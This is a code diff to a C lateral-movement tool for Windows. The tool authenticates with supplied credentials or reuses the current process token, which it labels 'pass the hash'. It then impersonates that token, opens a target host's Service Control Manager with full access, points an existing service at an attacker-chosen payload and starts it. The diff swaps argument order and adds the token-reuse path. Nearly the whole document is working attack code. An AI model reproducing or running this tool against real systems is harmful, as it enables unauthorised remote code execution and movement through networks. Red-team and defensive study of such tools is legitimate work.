@@ -9,8 +9,8 @@ int main(int argc, char **argv) {
     CHAR* targetHost = argv[1];
     CHAR* serviceName = argv[2];
     CHAR* payload = argv[3];
-    CHAR* username = argv[4];
-    CHAR* domain = argv[5];
+    CHAR* domain = argv[4];
+    CHAR* username = argv[5];
     CHAR* password = argv[6];
     LPQUERY_SERVICE_CONFIGA lpqsc = NULL;
     DWORD dwLpqscSize = 0;
@@ -28,20 +28,27 @@ int main(int argc, char **argv) {
         printf("Trying to connect to %s\n", targetHost);
     }
 
+    HANDLE hToken = NULL;
     if(username != NULL) {
-        HANDLE hToken = NULL;
         printf("Username was provided attempting to call LogonUserA\n");
         bResult = LogonUserA(username, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken);
         if(!bResult) {
             printf("LogonUserA failed %ld\n", GetLastError());
             ExitProcess(0);
         }
-        bResult = FALSE;
-        bResult = ImpersonateLoggedOnUser(hToken);
-        if(!bResult) {
-            printf("ImpersonateLoggedOnUser failed %ld\n", GetLastError());
+    } else {
+        printf("Using current process context for authentication. (Pass the hash)\n");
+        if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
+            printf("OpenProcessToken failed %ld\n", GetLastError());
             ExitProcess(0);
         }
+    }
+
+    bResult = FALSE;
+    bResult = ImpersonateLoggedOnUser(hToken);
+    if(!bResult) {
+        printf("ImpersonateLoggedOnUser failed %ld\n", GetLastError());
+        ExitProcess(0);
     }
 
     SC_HANDLE schManager = OpenSCManagerA(targetHost, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
@@ -81,7 +88,7 @@ int main(int argc, char **argv) {
     printf("Service path was changed to \"%s\"\n", payload);
 
     bResult = FALSE;
-    bResult = StartServiceA(schService, NULL, NULL);
+    bResult = StartServiceA(schService, 0, NULL);
     DWORD dwResult = GetLastError();
     if(!bResult && dwResult != 1053) {
         printf("StartServiceA failed to start the service. %ld\n", GetLastError());
